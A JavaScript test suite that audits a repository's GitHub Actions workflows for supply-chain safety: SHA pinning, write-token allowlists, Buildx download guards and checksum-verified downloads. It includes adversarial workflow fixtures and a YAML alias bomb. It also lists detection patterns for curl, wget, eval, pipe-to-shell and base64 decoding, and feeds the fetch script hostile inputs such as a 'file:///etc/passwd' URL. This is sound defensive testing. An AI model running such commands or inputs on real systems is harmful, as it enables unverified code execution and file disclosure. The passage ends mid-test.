// Supply-chain pins (#143, SECURITY.md): every GitHub Action is pinned to a full
// commit SHA with a version comment, and every Dockerfile base image to a digest.
//
// Write tokens versus third-party code (#194): a job whose GITHUB_TOKEN can write
// (packages, contents, id-token, security-events, ...) may only use the few
// actions below. Scanners, linters and setup actions run in read-only jobs. This
// is the lesson of the 2026 LiteLLM compromises: a scanner action that ran next to
// a publish credential was the way the credential was stolen.
//
// Workflows are read with the `yaml` package in strict mode (any parse error, a
// duplicate key or an alias bomb fails the test), aliases and merge keys are
// resolved, and the checks walk the parsed data, including local reusable
// workflows and local composite actions. The checks themselves are exercised
// against adversarial in-memory workflows at the bottom of this file.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { test } from "node:test";
import { isMap, isScalar, parseDocument, visit } from "yaml";

const root = fileURLToPath(new URL("..", import.meta.url));
const workflowsDir = join(root, ".github/workflows");
const actionsDir = join(root, ".github/actions");
const FETCH_SCRIPT = ".github/scripts/fetch-verified.sh";

// Actions allowed in a job that has any `write` permission, explicit or inherited
// from the workflow level, from the caller of a reusable workflow, or from the
// repository default when nothing is declared. Keep this minimal: every entry must
// be used by a write job (checked below). Each one is GitHub-owned or the
// registry/build plumbing the image pipeline cannot do without, and none downloads
// an executable at run time: setup-buildx-action can, so every write job that uses
// it first asserts the runner's own Buildx and sets no `version` (checked below).
// Tools that only need to read (Trivy, helm, kubeconform, cargo-deny, Node, Rust,
// the CodeQL bundle, ...) never belong here.
export const WRITE_JOB_ACTIONS = new Map([
  // GitHub-owned. Fetches the sources to build, the script to run or the SARIF file's repository.
  ["actions/checkout", "GitHub-owned; no network access beyond the repository"],
  // GitHub-owned. The upload job reads the SARIF file the read-only analysis job produced.
  ["actions/download-artifact", "GitHub-owned; hands the SARIF file from the read-only analysis job to the upload job"],
  // Docker-owned. The three steps that build and push an image to ghcr.io; the
  // pipeline cannot push without them. login-action only writes the Docker config.
  ["docker/setup-buildx-action", "Docker-owned; creates the BuildKit builder (pinned image) for build-push and imagetools"],
  ["docker/login-action", "Docker-owned; logs in to ghcr.io with the job token"],
  ["docker/build-push-action", "Docker-owned; builds and pushes the image with its SBOM and provenance"],
  // GitHub-owned. Uploading code-scanning results needs `security-events: write`.
  // It sends a SARIF file and downloads no CodeQL bundle (init and analyze, which
  // do, run in a read-only job).
  ["github/codeql-action/upload-sarif", "GitHub-owned; uploads the SARIF file the read-only analysis job wrote"],
]);

// Actions that download a tool at run time without a checksum that this repository
// pins. They are not used anywhere: install the tool with
// .github/scripts/fetch-verified.sh (the helm, kubeconform, Trivy and cosign steps,
// .github/actions/setup-node).
const UNVERIFIED_INSTALLERS = new Map([
  ["actions/setup-node", "downloads a floating Node release without a checksum; use ./.github/actions/setup-node"],
  ["azure/setup-helm", "does not verify the helm download; fetch it with .github/scripts/fetch-verified.sh"],
  ["aquasecurity/trivy-action", "installs Trivy through setup-trivy, whose checksum comes from the same release; fetch the pinned binary"],
  ["aquasecurity/setup-trivy", "the checksum comes from the same release; fetch the pinned binary"],
  ["sigstore/cosign-installer", "fetch the pinned cosign release with .github/scripts/fetch-verified.sh"],
]);

// ---- strict YAML ----

export function parseStrict(text, file) {
  const doc = parseDocument(text, { version: "1.2", uniqueKeys: true, merge: true, prettyErrors: true });
  const problems = [...doc.errors, ...doc.warnings].map(e => e.message.split("\n")[0]);
  if (problems.length) throw new Error(`${file}: ${problems.join("; ")}`);
  if (!isMap(doc.contents)) throw new Error(`${file}: the top level is not a mapping`);
  return doc;
}

// Aliases and merge keys resolved; an alias bomb throws.
export const toData = doc => doc.toJS({ maxAliasCount: 100 });

// ---- repository files ----

const walk = dir => readdirSync(dir, { withFileTypes: true }).flatMap(e => (e.isDirectory() ? walk(join(dir, e.name)) : [join(dir, e.name)]));

function repoFiles() {
  const rel = p => p.slice(root.length);
  const workflows = readdirSync(workflowsDir).filter(f => /\.ya?ml$/.test(f)).map(f => join(workflowsDir, f));
  const actions = existsSync(actionsDir) ? walk(actionsDir).filter(f => /(^|\/)action\.ya?ml$/.test(f)) : [];
  return [...workflows, ...actions].map(path => ({ file: rel(path), text: readFileSync(path, "utf8") }));
}

export function readLocalFromRepo(path) {
  const full = join(root, path);
  return existsSync(full) ? readFileSync(full, "utf8") : null;
}

// ---- pinning ----

// Every `uses:` anywhere in the file, read from the syntax tree so comments and
// flow-style or aliased values are seen as they are.
export function pinViolations(text, file) {
  const doc = parseStrict(text, file);
  const out = [];
  visit(doc, {
    Pair(_, pair) {
      if (!isScalar(pair.key) || pair.key.value !== "uses") return;
      const v = pair.value;
      if (!isScalar(v) || typeof v.value !== "string") {
        out.push(`${file}: a 'uses' value is not a plain string (aliases and expressions cannot be checked)`);
        return;
      }
      const ref = v.value;
      if (ref.startsWith("./")) return; // local actions and reusable workflows
      if (ref.startsWith("docker://")) {
        if (!/@sha256:[0-9a-f]{64}$/.test(ref)) out.push(`${file}: ${ref} is not pinned by digest`);
        return;
      }
      if (!/@[0-9a-f]{40}$/.test(ref) || !(v.comment ?? "").trim()) out.push(`${file}: ${ref} needs a full commit SHA and a version comment`);
    },
  });
  return out;
}

// ---- permissions ----

// With no `permissions` anywhere the job gets the repository's default token,
// which can be read/write.
const DEFAULT_PERMISSIONS = "write-all";

export function hasWrite(perms) {
  if (typeof perms === "string") return perms !== "read-all";
  if (perms && typeof perms === "object" && !Array.isArray(perms)) {
    return Object.values(perms).some(v => !["read", "none"].includes(v));
  }
  return true; // null, a list or a number: cannot be shown read-only
}

// A job's own block replaces the workflow's. Without either, a called workflow
// inherits the caller's permissions and a top-level one the repository default.
export function jobPermissions(data, job, callerPerms) {
  if (job.permissions !== undefined) return job.permissions;
  if (data.permissions !== undefined) return data.permissions;
  return callerPerms !== undefined ? callerPerms : DEFAULT_PERMISSIONS;
}

// A caller's permissions cap the called workflow's jobs.
export function jobCanWrite(data, job, callerPerms) {
  if (callerPerms !== undefined && !hasWrite(callerPerms)) return false;
  return hasWrite(jobPermissions(data, job, callerPerms));
}

const stepsOf = job => (Array.isArray(job?.steps) ? job.steps.filter(s => s && typeof s === "object") : []);
const jobsOf = data => Object.entries(data?.jobs && typeof data.jobs === "object" ? data.jobs : {});
export const actionName = ref => String(ref).split("@")[0].toLowerCase();

const isLocal = ref => ref.startsWith("./") || ref.startsWith("../");
const normalizeLocal = ref => ref.replace(/^\.\//, "").replace(/\/+$/, "");

function loadLocalAction(dir, readLocal) {
  for (const name of ["action.yml", "action.yaml"]) {
    const text = readLocal(`${dir}/${name}`);
    if (text !== null) return { file: `${dir}/${name}`, text };
  }
  return null;
}

// One reference used by a job that can write. Local composite actions are opened
// and their steps checked; local reusable workflows are checked as their own jobs
// (with the caller's permissions as the cap).
function checkRef(ref, kind, ctx, where, out, depth) {
  if (typeof ref !== "string") {
    out.push(`${where}: a 'uses' value is not a string`);
    return;
  }
  if (isLocal(ref)) {
    const path = normalizeLocal(ref);
    if (ref.startsWith("../") || path.split("/").includes("..")) {
      out.push(`${where}: ${ref} leaves the repository`);
    } else if (kind === "job") {
      if (!path.startsWith(".github/workflows/")) out.push(`${where}: ${ref} is not a local reusable workflow`);
    } else if (depth >= 5) {
      out.push(`${where}: ${ref} nests composite actions too deeply to check`);
    } else {
      const action = loadLocalAction(path, ctx.readLocal);
      if (!action) {
        out.push(`${where}: cannot read ${ref}`);
        return;
      }
      const data = toData(parseStrict(action.text, action.file));
      if (data.runs?.using === "docker" && String(data.runs.image ?? "").startsWith("docker://")) {
        out.push(`${where}: ${ref} runs ${data.runs.image}`);
      }
      for (const step of stepsOf(data.runs)) {
        if (step.uses !== undefined) checkRef(step.uses, "step", ctx, `${where} via ${ref}`, out, depth + 1);
      }
    }
    return;
  }
  if (kind === "step" && ctx.allowed.has(actionName(ref))) return;
  out.push(`${where}: ${ref} is not on the write-job allowlist`);
}

// Violations for one workflow document: jobs that can write using anything off
// the allowlist. `callerPerms` is set when the workflow is called by another one.
export function workflowViolations(file, text, ctx, callerPerms, depth = 0) {
  const out = [];
  const data = toData(parseStrict(text, file));
  for (const [name, job] of jobsOf(data)) {
    const canWrite = jobCanWrite(data, job, callerPerms);
    const label = `${file}: job '${name}'${callerPerms !== undefined ? " (called)" : ""}`;
    if (canWrite) {
      if (job.uses !== undefined) checkRef(job.uses, "job", ctx, `${label} uses`, out, 0);
      stepsOf(job).forEach((step, i) => {
        if (step.uses !== undefined) checkRef(step.uses, "step", ctx, `${label} step ${i + 1} (can write) uses`, out, 0);
      });
    }
    // A local reusable workflow's own jobs, under what this job grants it.
    if (typeof job.uses === "string" && isLocal(job.uses)) {
      const path = normalizeLocal(job.uses);
      const callee = path.startsWith(".github/workflows/") && depth < 5 ? ctx.readLocal(path) : null;
      if (callee === null) {
        if (canWrite) out.push(`${label}: cannot read ${job.uses}`);
      } else {
        const granted = canWrite ? jobPermissions(data, job, callerPerms) : {};
        out.push(...workflowViolations(path, callee, ctx, granted, depth + 1));
      }
    }
  }
  return out;
}

export function allWriteViolations(files, readLocal, allowed = WRITE_JOB_ACTIONS) {
  const ctx = { readLocal, allowed };
  const out = files.filter(f => f.file.includes("workflows/")).flatMap(f => workflowViolations(f.file, f.text, ctx));
  return [...new Set(out)];
}

// ---- Buildx ----

// docker/setup-buildx-action downloads an unverified Buildx when the runner has
// none, when `version` is set, or for the cloud driver. In a job that can write it
// must be preceded by a step that fails unless the runner already has Buildx, and
// it must set none of those inputs. Its BuildKit image is pinned by digest anywhere.
export function buildxViolations(file, text, callerPerms) {
  const out = [];
  const data = toData(parseStrict(text, file));
  for (const [name, job] of jobsOf(data)) {
    const canWrite = jobCanWrite(data, job, callerPerms);
    const steps = stepsOf(job);
    steps.forEach((step, i) => {
      if (typeof step.uses !== "string" || actionName(step.uses) !== "docker/setup-buildx-action") return;
      // The guard is the step immediately before, unconditional, failure-propagating,
      // and its whole script is the one command.
      const prev = steps[i - 1];
      const guarded = !!prev && typeof prev.run === "string" && prev.run.trim() === "docker buildx version"
        && prev.if === undefined && prev["continue-on-error"] === undefined && prev.shell === undefined;
      const where = `${file}: job '${name}' step ${i + 1}`;
      const w = step.with ?? {};
      if (w.version !== undefined) out.push(`${where}: sets 'version', which downloads Buildx`);
      if (String(w.driver ?? "docker-container") === "cloud") out.push(`${where}: the cloud driver downloads Buildx`);
      if (!/(^|[\s,])image=\S+@sha256:[0-9a-f]{64}(\s|,|$)/.test(String(w["driver-opts"] ?? ""))) out.push(`${where}: the BuildKit image is not pinned by digest`);
      if (canWrite && !guarded) out.push(`${where}: no earlier 'docker buildx version' step to rule out the download (job can write)`);
    });
  }
  return out;
}

// ---- run-time downloads ----

// Every run-time download goes through one first-party script, which checks a
// SHA-256 before the file is used. Any other mechanism in a run: block fails.
const DOWNLOADERS = [
  [/\bcurl\b/, "curl"],
  [/\bwget\b/, "wget"],
  [/\bgh\s+(release|run|extension|attestation|repo\s+clone)\b/, "gh download"],
  [/\bgh\s+api\b/, "gh api"],
  [/\b(Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b/i, "PowerShell download"],
  [/\b(urllib|urlopen|http\.client|requests\.(get|post)|fetch\s*\(|https?\.get)\b/, "inline HTTP client"],
  [/\b(python3?|node|deno|bun|perl|ruby)\s+-[ec]\b/, "inline script"],
  [/\b(go install|cargo install|cargo binstall|pip3? install|brew install|npm (install|i) (-g|--global)|gem install)\b/, "package-manager tool install"],
];

// The staging rehearsal's readiness probe talks to the local stack, not the
// internet. Exempt only as a whole line, exactly (no extra arguments such as --next).
const LOCAL_PROBE = /^[ \t]*curl --fail --silent --show-error --cacert \.local\/staging\/local-ca\.crt https:\/\/localhost:18443\/health\/ready[ \t]*$/gm;

// `gh api` talks to the GitHub API with the job token (prune-dev-images deletes old
// dev package versions); it fetches no code. Exempt only these exact shapes, in that
// file: listing and deleting this repository's own container package versions.
const GH_API_FILES = new Set([".github/workflows/prune-dev-images.yml"]);
const GH_API_ALLOWED = [
  /gh api --paginate "\/users\/\$OWNER\/packages\/container\/\$package\/versions\?per_page=100" \| jq -s 'add \/\/ \[\]'/g,
  /gh api -X DELETE "\/users\/\$OWNER\/packages\/container\/\$package\/versions\/\$id"/g,
];

// Constructs that hide what runs. The check above is a guard against accidental,
// unverified downloads; it cannot model arbitrary shell, so these are refused
// outright and anything cleverer is for review to catch (main is protected).
const OBSCURING = [
  [/\beval\b/, "eval"],
  [/\|\s*(sudo\s+)?(ba|z|da)?sh\b/, "piping into a shell"],
  [/\bbase64\s+(-d|--decode)\b/, "base64 decoding"],
  [/\bsource\s+<\(|\.\s+<\(/, "sourcing a process substitution"],
  [/--next\b/, "curl --next"],
];

export function downloadViolations(file, script) {
  const out = [];
  // Whole-line shell comments do not run.
  const joined = script.replace(/^[ \t]*#.*$/gm, "").replace(/\\\n\s*/g, " ");
  for (const [re, label] of OBSCURING) {
    if (re.test(joined)) out.push(`${file}: ${label} in a run step is not allowed`);
  }
  let text = joined.replace(LOCAL_PROBE, "");
  if (GH_API_FILES.has(file)) for (const re of GH_API_ALLOWED) text = text.replace(re, "");
  for (const [re, label] of DOWNLOADERS) {
    if (re.test(text)) out.push(`${file}: ${label} in a run step; use ${FETCH_SCRIPT} <https-url> <sha256> <dest>`);
  }
  // Calls of the script: literal https URL, literal 64-hex checksum.
  const call = /(?:^|[\s;&|(])(?:bash\s+|sh\s+|\.\/)?(\S*fetch-verified\.sh)(.*)/gm;
  for (const m of text.matchAll(call)) {
    const where = `${file}: ${m[0].trim().slice(0, 100)}`;
    if (m[1] !== FETCH_SCRIPT) out.push(`${where}: call the script as ${FETCH_SCRIPT}`);
    const args = m[2].match(/^\s+"?(https:\/\/[^\s"'$`\\{}()<>;|&]+)"?\s+"?([0-9a-f]{64})"?\s+("[^"]+"|'[^']+'|[^\s;&|]+)\s*(;;)?\s*$/);
    if (!args) out.push(`${where}: the URL and checksum must be literals (an https:// URL and 64 hex digits)`);
  }
  return out;
}

function runScripts(data) {
  const scripts = [];
  for (const [name, job] of jobsOf(data)) stepsOf(job).forEach((s, i) => typeof s.run === "string" && scripts.push([`job '${name}' step ${i + 1}`, s.run]));
  for (const [i, s] of stepsOf(data.runs).entries()) if (typeof s.run === "string") scripts.push([`step ${i + 1}`, s.run]);
  return scripts;
}

// ---- tests on the repository ----

test("every workflow and local action parses strictly", () => {
  const files = repoFiles();
  assert.ok(files.some(f => f.file.endsWith("image.yml")));
  for (const { file, text } of files) toData(parseStrict(text, file));
});

test("every workflow action is pinned to a commit SHA with a version comment", () => {
  const unpinned = repoFiles().flatMap(({ file, text }) => pinViolations(text, file));
  assert.deepEqual(unpinned, []);
});

test("every Dockerfile base image is pinned by digest", () => {
  const unpinned = [];
  for (const file of ["Dockerfile", "deploy/loadtest/Dockerfile"]) {
    readFileSync(join(root, file), "utf8").split("\n").forEach((line, i) => {
      const m = line.match(/^FROM\s+(\S+)/i);
      if (m && !/@sha256:[0-9a-f]{64}$/.test(m[1])) unpinned.push(`${file}:${i + 1} ${m[1]}`);
    });
  }
  assert.deepEqual(unpinned, []);
});

test("jobs that can write use only allowlisted actions (#194)", () => {
  assert.deepEqual(allWriteViolations(repoFiles(), readLocalFromRepo), []);
});

test("every allowlisted write-job action is used by a write job", () => {
  // Remove an action from the list when nothing needs it any more: take it out of
  // the allowlist, run the check above, and see what fails.
  const unused = [];
  const files = repoFiles();
  for (const name of WRITE_JOB_ACTIONS.keys()) {
    const without = new Map([...WRITE_JOB_ACTIONS].filter(([k]) => k !== name));
    if (allWriteViolations(files, readLocalFromRepo, without).length === 0) unused.push(name);
  }
  assert.deepEqual(unused, [], "remove allowlist entries no write job uses");
});

test("setup-buildx-action never downloads Buildx next to a write token", () => {
  const files = repoFiles().filter(f => f.file.includes("workflows/"));
  assert.ok(files.length);
  assert.deepEqual(files.flatMap(({ file, text }) => buildxViolations(file, text)), []);
});

test("no workflow uses an installer that downloads a tool without a pinned checksum", () => {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    const refs = [...jobsOf(data).flatMap(([, job]) => [job.uses, ...stepsOf(job).map(s => s.uses)]), ...stepsOf(data.runs).map(s => s.uses)];
    for (const ref of refs.filter(r => typeof r === "string")) {
      const why = UNVERIFIED_INSTALLERS.get(actionName(ref));
      if (why) found.push(`${file}: ${ref}: ${why}`);
    }
  }
  assert.deepEqual(found, []);
});

test("every run-time download goes through fetch-verified.sh with a literal URL and checksum", () => {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    for (const [where, script] of runScripts(data)) found.push(...downloadViolations(file, script).map(v => `${where}: ${v}`));
  }
  assert.deepEqual(found, []);
  // The download steps exist (a guard against this check going vacuous).
  const calls = repoFiles().filter(f => /fetch-verified\.sh/.test(f.text)).map(f => f.file);
  for (const f of [".github/workflows/image.yml", ".github/workflows/ci.yml", ".github/actions/setup-node/action.yml"]) assert.ok(calls.includes(f), `${f} fetches its tools with the script`);
});

test("taiki-e/install-action installs exact versions with its checksum check on", () => {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    for (const [name, job] of jobsOf(data)) {
      for (const step of stepsOf(job)) {
        if (typeof step.uses !== "string" || actionName(step.uses) !== "taiki-e/install-action") continue;
        const tools = String(step.with?.tool ?? "").split(",").map(t => t.trim()).filter(Boolean);
        if (!tools.length || tools.some(t => !/^[\w.-]+@\d+\.\d+\.\d+$/.test(t))) found.push(`${file}: job '${name}' tool '${step.with?.tool}' is not name@x.y.z`);
        if (String(step.with?.checksum ?? "true") !== "true") found.push(`${file}: job '${name}' disables the checksum`);
      }
    }
  }
  assert.deepEqual(found, []);
});

// ---- the fetch script ----

function runFetch(args, { curlBody, curlFails = false } = {}) {
  const dir = mkdtempSync(join(tmpdir(), "fetch-verified-"));
  try {
    // A stand-in curl on PATH: records its arguments and "downloads" a local file.
    const stub = join(dir, "bin");
    writeFileSync(join(dir, "args.log"), "");
    const body = join(dir, "body");
    writeFileSync(body, curlBody ?? "payload\n");
    const script = [
      "#!/usr/bin/env bash",
      `printf '%s\\n' "$*" >> '${join(dir, "args.log")}'`,
      curlFails ? "exit 22" : "",
      'out=""; while [ $# -gt 0 ]; do [ "$1" = "--output" ] && out="$2"; shift; done',
      `cp '${body}' "$out"`,
    ].join("\n");
    spawnSync("mkdir", ["-p", stub]);
    writeFileSync(join(stub, "curl"), script);
    chmodSync(join(stub, "curl"), 0o755);
    const dest = join(dir, "out", "tool");
    spawnSync("mkdir", ["-p", join(dir, "out")]);
    const resolved = args.map(a => (a === "DEST" ? dest : a));
    const r = spawnSync("bash", [join(root, FETCH_SCRIPT), ...resolved], { env: { ...process.env, PATH: `${stub}:${process.env.PATH}` }, encoding: "utf8" });
    return { ...r, dest, leftovers: readdirSync(join(dir, "out")), curlArgs: readFileSync(join(dir, "args.log"), "utf8"), cleanup: () => rmSync(dir, { recursive: true, force: true }) };
  } catch (e) {
    rmSync(dir, { recursive: true, force: true });
    throw e;
  }
}

const sha256 = body => spawnSync("bash", ["-c", `printf '%s' "$1" | (sha256sum 2>/dev/null || shasum -a 256) | cut -d' ' -f1`, "_", body], { encoding: "utf8" }).stdout.trim();
const GOOD_URL = "https://example.org/releases/tool.tar.gz";

test("fetch-verified.sh moves a download into place only after the checksum matches", () => {
  const r = runFetch([GOOD_URL, sha256("payload\n"), "DEST"]);
  try {
    assert.equal(r.status, 0, r.stderr);
    assert.equal(readFileSync(r.dest, "utf8"), "payload\n");
    assert.deepEqual(r.leftovers, ["tool"], "no temporary file is left next to the destination");
    for (const flag of ["--proto =https", "--proto-redir =https", "--fail"]) assert.ok(r.curlArgs.includes(flag), `curl gets ${flag}`);
    assert.ok(r.curlArgs.includes(GOOD_URL));
  } finally {
    r.cleanup();
  }
});

test("fetch-verified.sh fails closed on a wrong checksum and leaves nothing at the destination", () => {
  const r = runFetch([GOOD_URL, "0".repeat(64), "DEST"]);
  try {
    assert.notEqual(r.status, 0);
    assert.match(r.stderr, /checksum/i);
    assert.equal(existsSync(r.dest), false);
    assert.deepEqual(r.leftovers, [], "the temporary file is removed too");
  } finally {
    r.cleanup();
  }
});

test("fetch-verified.sh fails closed when the download fails", () => {
  const r = runFetch([GOOD_URL, sha256("payload\n"), "DEST"], { curlFails: true });
  try {
    assert.notEqual(r.status, 0);
    assert.equal(existsSync(r.dest), false);
    assert.deepEqual(r.leftovers, []);
  } finally {
    r.cleanup();
  }
});

test("fetch-verified.sh accepts only an https URL, a 64-hex checksum and three arguments", () => {
  const sum = sha256("payload\n");
  const cases = {
    "http URL": ["http://example.org/x", sum, "DEST"],
    "file URL": ["file:///etc/passwd", sum, "DEST"],
    "ftp URL": ["ftp://example.org/x", sum, "DEST"],
    "option as URL": ["--output=/tmp/x", sum, "DEST"],
    "URL with a space": ["https://example.org/a b", sum, "DEST"],
    "short checksum": [GOOD_URL, sum.slice(0, 63), "DEST"],
    "uppercase checksum": [GOOD_URL, sum.toUpperCase(), "DEST"],
    "no destination": [GOOD_URL, sum],
    "extra argument": [GOOD_URL, sum, "DEST", "more"],
  };
  for (const [name, args] of Object.entries(cases)) {
    const r = runFetch(args);
    try {
      assert.notEqual(r.status, 0, name);
      assert.equal(r.curlArgs, "", `${name}: curl was never called`);
      assert.equal(existsSync(r.dest), false, name);
    } finally {
      r.cleanup();
    }
  }
});

test("fetch-verified.sh refuses to overwrite an existing destination", () => {
  const dir = mkdtempSync(join(tmpdir(), "fetch-verified-"));
  try {
    const dest = join(dir, "tool");
    writeFileSync(dest, "original");
    const r = spawnSync("bash", [join(root, FETCH_SCRIPT), GOOD_URL, sha256("payload\n"), dest], { encoding: "utf8" });
    assert.notEqual(r.status, 0);
    assert.equal(readFileSync(dest, "utf8"), "original");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("no workflow can switch the fetch script into a test mode", () => {
  assert.doesNotMatch(readFileSync(join(root, FETCH_SCRIPT), "utf8"), /\b(FETCH_VERIFIED_|TEST_MODE|ALLOW_INSECURE)/);
});

// ---- adversarial fixtures: the checks must catch these ----

const SHA = n => String(n).repeat(40);
const wf = body => `name: fixture\non: push\n${body}\n`;
const noLocal = () => null;
const violations = (text, readLocal = noLocal) => allWriteViolations([{ file: ".github/workflows/fixture.yml", text }], readLocal);
const localFiles = files => path => files[path] ?? null;

test("fixtures: write-permission bypasses are caught", () => {
  const evil = "aquasecurity/trivy-action@master";
  // flow-style workflow (the reader this replaced skipped it)
  assert.ok(violations(`name: bypass\non: push\npermissions: {packages: write}\njobs: { evil: { runs-on: ubuntu-24.04, steps: [{ uses: ${evil} }] } }\n`).length);
  // an alias supplies the permissions
  assert.ok(violations(wf(`x-perm: &p {packages: write}\npermissions: *p\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // an alias supplies the steps, a merge key the whole job
  assert.ok(violations(wf(`x-steps: &s\n  - uses: ${evil}\npermissions: write-all\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps: *s`)).length);
  assert.ok(violations(wf(`x-job: &j\n  runs-on: ubuntu-24.04\n  permissions: {packages: write}\n  steps: [{uses: ${evil}}]\njobs:\n  evil:\n    <<: *j`)).length);
  // no permissions anywhere: the repository default token
  assert.ok(violations(wf(`jobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // write-all, at the workflow level and the job level
  assert.ok(violations(wf(`permissions: write-all\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  assert.ok(violations(wf(`permissions: read-all\njobs:\n  evil:\n    permissions: write-all\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // an empty block is not proof of read-only
  assert.ok(violations(wf(`jobs:\n  evil:\n    permissions:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // docker:// and an external reusable workflow
  assert.ok(violations(wf(`permissions: {contents: read}\njobs:\n  evil:\n    permissions: {packages: write}\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: docker://alpine@sha256:${"a".repeat(64)}`)).length);
  assert.ok(violations(wf(`permissions: {contents: read}\njobs:\n  evil:\n    permissions: {packages: write}\n    uses: other/repo/.github/workflows/x.yml@${SHA(1)}`)).length);
  // a local action path that escapes the repository, or does not exist
  assert.ok(violations(wf(`permissions: {packages: write}\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ../outside`)).length);
  assert.ok(violations(wf(`permissions: {packages: write}\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/missing`)).length);
});

test("fixtures: an action hidden in a local composite or a called workflow is caught", () => {
  const composite = `name: c\ndescription: d\nruns:\n  using: composite\n  steps:\n    - uses: ./.github/actions/inner\n`;
  const inner = `name: i\ndescription: d\nruns:\n  using: composite\n  steps:\n    - uses: aquasecurity/trivy-action@${SHA(2)} # v1\n`;
  const files = { ".github/actions/outer/action.yml": composite, ".github/actions/inner/action.yml": inner };
  const job = perms => wf(`${perms}\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/outer`);
  assert.equal(violations(job("permissions: {packages: write}"), localFiles(files)).length, 1);
  // the same composite is fine where the token is read-only
  assert.equal(violations(job("permissions: {contents: read}"), localFiles(files)).length, 0);
  // a composite of run steps only is fine next to a write token
  const plain = { ".github/actions/outer/action.yml": `name: c\ndescription: d\nruns:\n  using: composite\n  steps:\n    - run: echo hi\n      shell: bash\n` };
  assert.equal(violations(job("permissions: {packages: write}"), localFiles(plain)).length, 0);

  // a reusable workflow inherits what its caller grants
  const callee = `name: callee\non: workflow_call\njobs:\n  scan:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: aquasecurity/trivy-action@${SHA(3)} # v1\n`;
  const caller = grant => wf(`permissions: {contents: read}\njobs:\n  call:\n    permissions: ${grant}\n    uses: ./.github/workflows/callee.yml`);
  const reusable = { ".github/workflows/callee.yml": callee };
  assert.equal(violations(caller("{packages: write, id-token: write}"), localFiles(reusable)).length, 1);
  assert.equal(violations(caller("{contents: read}"), localFiles(reusable)).length, 0);
  // a callee that declares write is capped by a read-only caller
  const greedy = { ".github/workflows/callee.yml": callee.replace("jobs:", "permissions: {packages: write}\njobs:") };
  assert.equal(violations(caller("{contents: read}"), localFiles(greedy)).length, 0);
  assert.equal(violations(caller("{packages: write}"), localFiles(greedy)).length, 1);
});

test("fixtures: ordinary workflows pass", () => {
  const ok = `permissions: {contents: read}\njobs:\n  scan:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: aquasecurity/trivy-action@${SHA(4)} # v1\n  push:\n    permissions: {contents: read, packages: write}\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@${SHA(5)} # v1\n      - uses: docker/login-action@${SHA(6)} # v1\n  call:\n    permissions: {packages: write}\n    uses: ./.github/workflows/other.yml\n`;
  assert.equal(violations(wf(ok), localFiles({ ".github/workflows/other.yml": "name: o\non: workflow_call\njobs:\n  a:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo\n" })).length, 0);
});

test("fixtures: the strict reader rejects what it cannot read safely", () => {
  assert.throws(() => parseStrict("name: x\nname: y\n", "dup.yml"), /dup\.yml/);
  assert.throws(() => parseStrict("name: [unclosed\n", "bad.yml"), /bad\.yml/);
  assert.throws(() => parseStrict("- a\n- b\n", "list.yml"), /mapping/);
  const bomb = ["a: &a [x, x, x, x, x, x, x, x, x, x]", ...Array.from("bcdefghij", (c, i) => `${c}: &${c} [${Array(10).fill("*" + "abcdefghi"[i]).join(", ")}]`), "z: [*j, *j, *j, *j, *j, *j, *j, *j, *j, *j]"].join("\n");
  assert.throws(() => toData(parseStrict(bomb, "bomb.yml")));
});

test("fixtures: unpinned references are caught wherever they are written", () => {
  const bad = refs => pinViolations(wf(`jobs:\n  j:\n    steps:\n${refs}`), "fixture.yml").length;
  assert.equal(bad(`      - uses: actions/checkout@v4 # v4`), 1);
  assert.equal(bad(`      - uses: actions/checkout@${SHA(1)}`), 1, "a SHA without a version comment");
  assert.equal(bad(`      - { uses: actions/checkout@${SHA(1)} }`), 1, "flow style cannot carry the comment");
  assert.equal(bad(`      - uses: docker://alpine:3`), 1);
  assert.equal(bad(`      - uses: &u actions/checkout@${SHA(1)} # v1\n      - uses: *u`), 1, "an alias cannot be checked");
  assert.equal(bad(`      - uses: \${{ env.ACTION }}`), 1);
  assert.equal(bad(`      - uses: actions/checkout@${SHA(1)} # v1\n      - uses: docker://alpine@sha256:${"b".repeat(64)}\n      - uses: ./.github/actions/x`), 0);
});

test("fixtures: Buildx downloads next to a write token are caught", () => {
  const job = (perms, steps) => wf(`jobs:\n  j:\n    runs-on: ubuntu-24.04\n    permissions: ${perms}\n    steps:\n${steps}`);
  const setup = extra => `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n        with:\n          driver-opts: image=mirror.gcr.io/moby/buildkit:v1@sha256:${"c".repeat(64)}\n${extra}`;
  const guard = `      - run: docker buildx version\n`;
  const check = (perms, steps) => buildxViolations("fixture.yml", job(perms, steps)).length;
  assert.equal(check("{packages: write}", setup("")), 1, "no guard step");
  assert.equal(check("{packages: write}", guard + setup("")), 0);
  assert.equal(check("{packages: write}", guard + setup("          version: latest\n")), 1);
  assert.equal(check("{packages: write}", guard + setup("          driver: cloud\n")), 1);
  assert.equal(check("{packages: write}", setup("") + guard), 1, "the guard must come first");
  // Guards that never protect anything (adversarial review of #194).
